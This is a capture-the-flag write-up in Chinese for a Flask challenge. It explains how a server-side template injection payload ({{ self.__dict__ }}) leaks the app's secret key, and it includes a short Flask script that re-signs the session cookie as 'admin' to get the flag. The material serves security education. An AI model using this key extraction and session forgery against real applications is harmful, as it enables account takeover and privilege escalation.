Flask 500 points
================

题意
-------------

The flag is prepared for only admin, can you get it?

http://host:port

解题步骤
-------------

经过测试，这是一个 `SSTI(Server Side Template Injection)` 题目，可以直接传 `Jinja template` ，从而获取到 `flag` 。首先，查看 `Cookie` 信息可以知道，当前的 `Cookie` 为 `{'username':'guest'}` 。我们的目标就是换成 `{'username':'admin'}` 。

研究了很久如何在 `Jinja template` 中向字典写入，但都失败了。最后找到了方案：找到对 `Cookie` 进行加/解密的 `Key` ，然后本地用同样地密钥加密我们想要的 `Session` 内容，达到欺骗服务端的目的。

通过 `{{ self.__dict__ }}` ，可以找到 `Secret Key` 为 `!955)aa1~2.7e2ad` 于是编写了 [flask_hijack.py](flask_hijack.py) ，然后在浏览器中将获取到的 `Cookie` 用于页面，就可以获得 `flag: THUCTF{Do_n0t_s4ve_4uth_1nfo_1n_fl4sk_s3ss10n}` 了。

```
secret_key = '!955)aa1~2.7e2ad'

from flask import (
    Flask,
    session)


app = Flask(__name__)
app.secret_key = secret_key

@app.route('/')
def hello_world():
    session["username"] = "admin" 

    print(session)
    return session["username"]
```

注：之后出题者称这个获取 `Secret Key` 的方法是非预期的，不过不知道真实上的方法是什么。
